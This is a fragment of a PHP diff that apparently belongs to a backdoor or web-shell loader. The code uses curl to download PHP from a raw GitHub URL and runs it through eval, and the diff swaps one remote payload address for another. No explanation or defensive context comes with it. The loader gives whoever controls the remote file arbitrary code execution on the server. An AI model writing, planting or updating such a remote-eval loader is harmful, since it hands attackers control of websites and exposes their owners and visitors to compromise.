@@ -8,7 +8,7 @@ eval('?>' . $code);
 goto end;
 
 start:
-$url = 'https://raw.githubusercontent.com/wawanbangke/ggo/refs/heads/main/about.php';
+$url = 'https://raw.githubusercontent.com/fallinginbinary/SHIT/refs/heads/main/indexx/indexx.php';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
